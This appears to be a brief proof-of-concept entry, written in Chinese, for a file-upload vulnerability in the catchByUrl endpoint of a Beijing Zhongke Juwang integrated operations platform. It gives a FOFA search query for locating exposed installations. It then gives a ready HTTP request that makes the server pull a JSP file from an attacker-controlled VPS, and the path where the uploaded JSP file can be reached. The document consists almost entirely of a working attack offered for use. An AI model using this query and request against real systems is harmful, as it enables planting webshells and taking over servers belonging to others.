## 北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞

## fofa
```
body="thirdparty/ueditor/WordPaster"
```

## poc
```
GET /resources/files/ue/catchByUrl?url=http://vpsip/exp.jsp HTTP/1.1 
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
Connection: close
```

![image](https://github.com/wy876/POC/assets/139549762/3e2d95ec-d3e1-44a9-aed6-17152ed0a3aa)

文件路径`http://ip/files/headimg/.jsp`
